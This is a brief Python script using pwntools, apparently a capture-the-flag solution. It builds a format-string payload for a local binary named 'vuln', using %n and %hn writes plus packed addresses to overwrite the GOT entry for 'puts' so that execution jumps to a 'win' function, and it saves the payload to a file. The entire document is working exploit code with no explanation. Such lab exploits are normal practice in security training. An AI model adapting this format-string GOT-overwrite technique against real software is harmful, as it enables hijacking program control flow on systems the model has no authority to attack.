#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe




def main():

    gotEx = exe.got['puts']
    print(hex(gotEx))
    print(hex(exe.symbols['win']))
    payload = b"%64X%11$n" + b"%41X%12$n" + b"%951X%13$n" + b"%3398X%14$hn" + p64(gotEx+2)
    payload += p64(0x404038) + p64(0x40403c) + p64(gotEx)
    with open("payload", "wb") as file:
        file.write(payload)
    

if __name__ == "__main__":
    main()
